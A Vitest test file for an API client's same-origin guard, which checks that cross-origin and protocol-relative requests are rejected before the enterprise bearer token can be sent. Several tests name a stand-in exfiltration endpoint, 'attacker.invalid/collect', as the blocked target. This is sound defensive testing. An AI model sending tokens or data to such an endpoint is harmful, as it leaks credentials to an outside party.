// @vitest-environment jsdom
//
// serverFetch same-origin guard (#3108): the shared request primitive attaches
// the enterprise bearer token by default, and `credentials: 'same-origin'`
// governs only ambient cookies — an explicitly-set Authorization header rides
// along to ANY absolute URL. These tests pin the guard: cross-origin targets
// are rejected BEFORE fetch is invoked, while relative and same-origin
// absolute dashboard paths keep working with the Authorization header intact.
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  clearEnterpriseAuthToken,
  serverFetch,
  setEnterpriseAuthToken,
} from './api-client';

describe('serverFetch same-origin guard (#3108)', () => {
  afterEach(() => {
    clearEnterpriseAuthToken();
    vi.unstubAllGlobals();
  });

  it('rejects a cross-origin absolute URL while a token is present, before fetch runs', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    setEnterpriseAuthToken('secret-enterprise-token');

    await expect(
      serverFetch('https://attacker.invalid/collect')
    ).rejects.toThrow(/cross-origin/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rejects a cross-origin URL object and an explicitly-passed token, before fetch runs', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);

    await expect(
      serverFetch(new URL('https://attacker.invalid/collect'), {}, 'explicit-token')
    ).rejects.toThrow(/cross-origin/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rejects a protocol-relative cross-origin target even with no token', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    clearEnterpriseAuthToken();

    await expect(serverFetch('//attacker.invalid/collect')).rejects.toThrow(
      /cross-origin/
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('still sends a relative /api request with the Authorization header', async () => {
    const fetchSpy = vi.fn(async () => new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);
    setEnterpriseAuthToken('secret-enterprise-token');

    const res = await serverFetch('/api/live');

    expect(res.status).toBe(200);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [input, init] = fetchSpy.mock.calls[0] as unknown as [
      RequestInfo | URL,
      RequestInit,
    ];
    expect(input).toBe('/api/live');
    expect(init.credentials).toBe('same-origin');
    expect(new Headers(init.headers).get('Authorization')).toBe(
      'Bearer secret-enterprise-token'
    );
  });

  it('allows a same-origin ABSOLUTE URL', async () => {
    const fetchSpy = vi.fn(async () => new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);
    setEnterpriseAuthToken('secret-enterprise-token');

    const res = await serverFetch(`${location.origin}/api/live`);

    expect(res.status).toBe(200);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
  });
});
